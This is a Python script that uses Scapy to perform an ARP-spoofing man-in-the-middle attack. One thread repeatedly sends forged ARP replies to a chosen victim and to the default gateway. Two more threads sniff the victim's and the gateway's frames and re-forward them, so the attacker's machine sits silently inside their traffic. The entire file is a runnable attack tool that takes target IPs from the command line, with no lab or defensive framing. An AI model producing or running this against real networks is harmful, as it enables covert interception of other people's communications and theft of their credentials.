from time import sleep
from scapy.all import *
from threading import Thread
import sys

from init_info import InitInfo

MAC_IP_TABLE = {}


class ArpThread(Thread):
    def run(self):
        while(True):
            self.ArpPoisen()
            sleep(2)
            
    def ArpPoisen(self):   
        eth1 = Ether(dst = MAC_IP_TABLE["VICTIM_MAC"] ,src = MAC_IP_TABLE["MY_MAC"])    
        victim_arp = ARP(op = 2, pdst = MAC_IP_TABLE["VICTIM_IP"], hwdst = MAC_IP_TABLE["VICTIM_MAC"],\
        psrc = MAC_IP_TABLE["DEFAULT_GATEWAY_IP"])
    
        eth2 = Ether(dst = MAC_IP_TABLE["DEFAULT_GATEWAY_MAC"] ,src = MAC_IP_TABLE["MY_MAC"]) 
        default_gw_arp = ARP(op = 2, pdst = MAC_IP_TABLE["DEFAULT_GATEWAY_IP"]\
        , hwdst = MAC_IP_TABLE["DEFAULT_GATEWAY_MAC"],\
        psrc = MAC_IP_TABLE["VICTIM_IP"])
        try:    
            sendp(eth1/victim_arp, verbose = False)
            sendp(eth2/default_gw_arp, verbose = False)
        except:
            print("Failed in arp spoof")
    


class InterceptForwardThread(Thread):
    def __init__(self, direction):
        Thread.__init__(self)
        self.direction = direction
        self.src_mac = MAC_IP_TABLE["MY_MAC"]
        self.dst_ip = ""
        self.dst_mac = ""
        self.src_ip = ""

    def run(self):
        if self.direction == "to default":
            host_mac_filter = MAC_IP_TABLE["VICTIM_MAC"]
            self.dst_ip = MAC_IP_TABLE["DEFAULT_GATEWAY_IP"]
            self.dst_mac = MAC_IP_TABLE["DEFAULT_GATEWAY_MAC"]
            self.src_ip = MAC_IP_TABLE["MY_IP"]            
        else:
            host_mac_filter = MAC_IP_TABLE["DEFAULT_GATEWAY_MAC"]
            self.dst_ip = MAC_IP_TABLE["VICTIM_IP"]
            self.dst_mac = MAC_IP_TABLE["VICTIM_MAC"]
            self.src_ip = MAC_IP_TABLE["DEFAULT_GATEWAY_IP"]
            
            
        sniff(filter="ether src " + host_mac_filter, timeout=1000, count=0 \
        ,prn = lambda packet: self.Forward(packet))
        
        
        
    def Forward(self ,packet):
        packet["Ether"].dst = self.dst_mac
        packet["Ether"].src = self.src_mac
        try:
            sendp(packet ,verbose = False)
        except:
            print("Error in Forward " + self.direction)
            
    
if __name__ == "__main__":
    victim_ip = sys.argv[1]
    default_gateway_ip = sys.argv[2]
    MAC_IP_TABLE = InitInfo(victim_ip ,default_gateway_ip)
    if not MAC_IP_TABLE:
        print("Plz Enter two valid victim IP addresses")
        sys.exit()
    print("Starting to spoof...")
    arp_thr = ArpThread()
    forward_to_gw_thr = InterceptForwardThread("to default")
    forward_to_victim_thr = InterceptForwardThread("to victim")
    
    arp_thr.start()
    forward_to_gw_thr.start()
    forward_to_victim_thr.start()
    
    
    arp_thr.join()
    forward_to_gw_thr.join()
    forward_to_victim_thr.join()
    
    


